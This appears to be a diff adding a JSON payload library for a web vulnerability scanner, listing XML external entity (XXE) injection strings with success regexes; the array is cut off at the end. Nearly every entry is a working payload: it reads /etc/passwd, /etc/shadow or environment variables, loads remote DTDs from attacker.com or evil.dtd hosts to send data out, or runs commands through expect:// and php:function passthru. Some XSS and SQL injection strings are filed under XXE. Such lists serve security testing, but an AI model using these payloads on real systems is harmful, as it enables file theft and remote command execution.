@@ -1,0 +1,1091 @@
+[
+  {
+    "payload_id": "OWP-0465",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0466",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0467",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0468",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/issue\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0469",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0470",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0471",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|\\[fonts"
+    }
+  },
+  {
+    "payload_id": "OWP-0472",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "cm9vd|PD9"
+    }
+  },
+  {
+    "payload_id": "OWP-0473",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "cm9vd|PD9"
+    }
+  },
+  {
+    "payload_id": "OWP-0474",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "PHP",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "cm9vd|PD9"
+    }
+  },
+  {
+    "payload_id": "OWP-0475",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;]><root>&send;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0476",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "uid="
+    }
+  },
+  {
+    "payload_id": "OWP-0477",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/internal\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-0478",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"> %file;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-1369",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1370",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/cmdline\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1371",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/status\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1372",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/net/arp\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1373",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/sched_debug\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1374",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/resolv.conf\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1375",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/ssh/sshd_config\">]><root>&xxe;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|localhost|Name|UID"
+    }
+  },
+  {
+    "payload_id": "OWP-1376",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-1377",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/hosts\"> %xxe;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "localhost"
+    }
+  },
+  {
+    "payload_id": "OWP-1378",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "cm9vd"
+    }
+  },
+  {
+    "payload_id": "OWP-1379",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-1380",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"php://filter/convert.base64-encode/resource=/etc/passwd\" parse=\"text\"/></root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "cm9vd"
+    }
+  },
+  {
+    "payload_id": "OWP-1381",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"file:///etc/passwd\"><foo>bar</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-1713",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-1714",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/group\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:"
+    }
+  },
+  {
+    "payload_id": "OWP-1715",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "XML Parser",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-31357",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\" >",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31358",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31359",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31360",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]><root>&foo;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31361",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31362",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE xxe [<!ENTITY foo \"aaaaaa\">]><root>&foo;</root>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31363",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><test></test>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31364",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31365",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31366",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31367",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/issue\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31368",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31369",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31370",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31371",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31372",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com:80\" >]><foo>&xxe;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31373",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example:443\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31374",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<test></test>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31375",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<![CDATA[<test></test>]]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31376",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "&foo;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31377",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "%foo;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31378",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31379",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<foo><![CDATA[' or 1=1 or ''=']]></foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31380",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31381",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xml SRC=\"xsstest.xml\" ID=I></xml>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31382",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<HTML xmlns:xss><?import namespace=\"xss\" implementation=\"http://ha.ckers.org/xss.htc\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31383",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><script>alert(123)</script></xsl:template></xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31384",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:copy-of select=\"document('/etc/passwd')\"/></xsl:template></xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31385",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:php=\"http://php.net/xsl\"><xsl:template match=\"/\"><xsl:value-of select=\"php:function('passthru','ls -la')\"/></xsl:template></xsl:stylesheet>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31386",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31387",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/shadow\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31388",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31389",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://example.com/text.txt\" >]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31390",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:////dev/random\">]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31391",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  \"> %int;",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31392",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!ENTITY % param3 \"<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31393",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM \"http://example.com/evil.dtd\">%dtd;%trick;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31394",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE xxe [ <!ENTITY % file SYSTEM \"file:///c:/boot.ini\"><!ENTITY % dtd SYSTEM \"http://example.com/evil.dtd\">%dtd;%trick;]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31395",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://x.x.x.x:22/\"> %dtd;]><xxx/>]]></foo></soap:Body>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:.*:0:0"
+    }
+  },
+  {
+    "payload_id": "OWP-31396",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM \"file://c:/boot.ini\">]><foo>&xee;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31397",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM \"file:///etc/passwd\">]><foo>&xee;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31398",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM \"file:///etc/shadow\">]><foo>&xee;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31399",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM \"file:///dev/random\">]><foo>&xee;</foo>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31400",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM \"file:///c:/boot.ini\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
+    "payload_id": "OWP-31401",
+    "vulnerability_category": "Injection (XXE)",
+    "target_technology": "Generic",
+    "injection_point": "body_xml",
+    "payload_string": "]>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "error|parse"
+    }
+  },
+  {
